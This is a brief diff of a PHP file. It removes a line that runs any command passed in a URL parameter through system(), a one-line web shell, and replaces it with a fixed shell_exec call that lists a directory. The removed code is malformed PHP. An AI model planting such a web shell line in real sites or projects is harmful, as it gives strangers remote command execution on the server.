@@ -1,5 +1,5 @@
 <?php
-echo 'hel'
-echo 'HELLO';
-echo system($_GET[cmd]); 
+$output = shell_exec('ls -lart');
+echo "<pre>$output</pre>";
 ?>
+
